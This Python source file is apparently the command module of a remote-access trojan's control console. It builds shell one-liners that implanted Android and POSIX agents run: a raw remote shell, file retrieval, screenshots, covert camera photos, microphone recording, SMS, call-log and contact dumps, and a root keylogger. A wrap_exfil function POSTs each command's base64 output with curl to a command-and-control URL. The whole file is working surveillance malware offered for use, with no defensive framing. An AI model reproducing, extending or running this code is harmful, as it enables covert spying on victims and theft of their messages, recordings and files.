"""quantum.rat.commands — remote-access capability builders (fleet console).

Each capability builds a POSIX/Android-shell one-liner that the stock
GHOSTFANG/OBSIDIAN agents already execute (they run the task's "cmd").
The controller wraps every command with output exfil over the EXISTING
/r data channel (wrap_exfil), so results land in LOOT_DIR/<host>/ with no
new protocol and no new agent binary required.

Honesty model: every capability declares `requires` (shown verbatim in the
APK dashboard). "stock" = runs on any posix/windows agent today;
"android-shell" = needs an Android shell (adb/termux); "termux-api" =
needs the Termux:API app + granted permissions; "root" = needs uid 0.
Dispatch is always allowed (queued in TASKQ); results appear only when a
live agent executes. Nothing here fabricates agent output.
"""
from __future__ import annotations

import shlex


def _q(s):
    """Shell-quote one argument for embedding in a dispatched command."""
    return shlex.quote(str(s))


def cmd_sysinfo():
    return ("uname -a 2>/dev/null; echo ---; id 2>/dev/null; echo ---; "
            "uptime 2>/dev/null; echo ---; "
            "getprop ro.product.model 2>/dev/null; getprop ro.build.version.release 2>/dev/null")


def cmd_shell_raw(cmd):
    if not cmd or not cmd.strip():
        raise ValueError("refusing to dispatch an empty shell command")
    return cmd.strip()


def cmd_locate():
    # coarse IP geolocation — labeled as such everywhere it is shown
    return "curl -s -m 15 https://ip-api.com/json/ 2>/dev/null | head -c 1024"


def cmd_file_list(path):
    return f"ls -la {_q(path)} 2>&1"


def cmd_file_get(path):
    return f"base64 {_q(path)} 2>/dev/null || cat {_q(path)} 2>/dev/null"


def cmd_screenshot():
    # Android screencap; base64 rides the data channel (PNG ~1-3 MB typical)
    return ("P=/data/local/tmp/.qshot.png; screencap -p $P 2>/dev/null && "
            "base64 $P 2>/dev/null; rm -f $P")


def cmd_camera(which=0):
    return (f"termux-camera-photo -c {int(which)} "
            "/data/data/com.termux/files/home/.qsnap.jpg 2>/dev/null && "
            "base64 /data/data/com.termux/files/home/.qsnap.jpg 2>/dev/null; "
            "rm -f /data/data/com.termux/files/home/.qsnap.jpg")


def cmd_mic(seconds=10):
    secs = max(1, min(int(seconds), 300))
    return (f"termux-microphone-record -d -f "
            f"/data/data/com.termux/files/home/.qmic.wav -l {secs} 2>/dev/null; "
            "sleep 1; base64 /data/data/com.termux/files/home/.qmic.wav 2>/dev/null; "
            "rm -f /data/data/com.termux/files/home/.qmic.wav")


def cmd_sms(limit=50):
    return f"termux-sms-list -l {max(1, min(int(limit), 500))} 2>/dev/null"


def cmd_calls(limit=50):
    return f"termux-call-log -l {max(1, min(int(limit), 500))} 2>/dev/null"


def cmd_contacts():
    return "termux-contact-list 2>/dev/null"


def cmd_applist():
    return "pm list packages -3 2>/dev/null || pm list packages 2>/dev/null"


def cmd_keylog_android(seconds=30):
    secs = max(5, min(int(seconds), 600))
    return (f"timeout {secs} getevent -l 2>/dev/null | head -c 65536; "
            "echo '[keylog window closed]'")


CAPABILITIES = {
    "sysinfo": {
        "title": "System info",
        "requires": "stock",
        "desc": "uname / id / uptime (+ Android model when present).",
        "build": lambda args: cmd_sysinfo(),
    },
    "shell": {
        "title": "Remote shell",
        "requires": "stock",
        "desc": "Raw shell one-liner, output exfiltrated. Use with care.",
        "build": lambda args: cmd_shell_raw(args.get("cmd", "")),
    },
    "locate": {
        "title": "Locate (IP, coarse)",
        "requires": "stock",
        "desc": "IP-based geolocation — city-level at best, never GPS.",
        "build": lambda args: cmd_locate(),
    },
    "ls": {
        "title": "List files",
        "requires": "stock",
        "desc": "ls -la of a remote path.",
        "build": lambda args: cmd_file_list(args.get("path", "/")),
    },
    "get": {
        "title": "Retrieve file",
        "requires": "stock",
        "desc": "base64 of a remote file through the data channel.",
        "build": lambda args: cmd_file_get(args.get("path", "")),
    },
    "shot": {
        "title": "Screenshot",
        "requires": "android-shell",
        "desc": "screencap PNG via the data channel (~1-3 MB typical).",
        "build": lambda args: cmd_screenshot(),
    },
    "snap": {
        "title": "Camera snapshot",
        "requires": "termux-api",
        "desc": "Rear (0) or front (1) photo via Termux:API.",
        "build": lambda args: cmd_camera(args.get("camera", 0)),
    },
    "mic": {
        "title": "Audio capture",
        "requires": "termux-api",
        "desc": "Microphone recording, default 10 s (max 300 s).",
        "build": lambda args: cmd_mic(args.get("seconds", 10)),
    },
    "sms": {
        "title": "SMS log",
        "requires": "termux-api",
        "desc": "Inbox list via Termux:API (needs SMS permission).",
        "build": lambda args: cmd_sms(args.get("limit", 50)),
    },
    "calls": {
        "title": "Call log",
        "requires": "termux-api",
        "desc": "Call history via Termux:API.",
        "build": lambda args: cmd_calls(args.get("limit", 50)),
    },
    "contacts": {
        "title": "Contacts",
        "requires": "termux-api",
        "desc": "Contact list via Termux:API.",
        "build": lambda args: cmd_contacts(),
    },
    "applist": {
        "title": "Installed apps",
        "requires": "android-shell",
        "desc": "Third-party packages via pm.",
        "build": lambda args: cmd_applist(),
    },
    "keylog": {
        "title": "Keylog window",
        "requires": "root",
        "desc": "getevent capture for N seconds (Android, root only).",
        "build": lambda args: cmd_keylog_android(args.get("seconds", 30)),
    },
}


def capability_names():
    return list(CAPABILITIES)


def describe(capability):
    """{title, requires, desc} for a capability, or None."""
    info = CAPABILITIES.get(capability)
    if info is None:
        return None
    return {"title": info["title"], "requires": info["requires"],
            "desc": info["desc"]}


def build(capability, args=None):
    """Shell command string for a capability; ValueError on unknown/empty."""
    info = CAPABILITIES.get(capability)
    if info is None:
        raise ValueError(
            f"unknown capability {capability!r} "
            f"(known: {', '.join(CAPABILITIES)})"
        )
    return info["build"](args or {})


def wrap_exfil(cmd, c2_url, host):
    """Wrap [cmd] so its output is POSTed to <c2_url>/r as a data drop.

    Runs cmd with stdout+stderr captured to a temp file, base64s it
    (portable: `-w0` with fallback), POSTs {"host","data"}, cleans up.
    The agent needs only curl + base64 + sh — all stock-agent tooling.
    """
    if not cmd or not cmd.strip():
        raise ValueError("refusing to wrap an empty command")
    c2 = c2_url.rstrip("/")
    # $TMPDIR covers termux/android; fallback /tmp covers posix desktops
    return (
        "T=${TMPDIR:-/tmp}/.qo$$; (" + cmd.strip() + ") >$T 2>&1; "
        "D=$(base64 -w0 <$T 2>/dev/null || base64 <$T 2>/dev/null | tr -d '\\n'); "
        "curl -s -m 25 -X POST " + c2 + "/r "
        "-H 'Content-Type: application/json' "
        "-d \"{\\\"host\\\":\\\"" + host.replace('"', '') + "\\\","
        "\\\"data\\\":\\\"$D\\\"}\" >/dev/null 2>&1; rm -f $T"
    )


def dispatch(taskq, host, capability, args=None, c2_url="http://127.0.0.1:8443"):
    """Queue a capability task for [host]; returns the queued task dict.

    taskq is the TASKQ mapping (injectable for tests). Raises ValueError on
    unknown capability or empty host.
    """
    if not host or not str(host).strip():
        raise ValueError("host must not be empty")
    host = str(host).strip()
    cmd = build(capability, args)
    task = {"act": "run", "cmd": wrap_exfil(cmd, c2_url, host)}
    taskq[host] = task
    return {"host": host, "capability": capability,
            "requires": CAPABILITIES[capability]["requires"], "task": task}
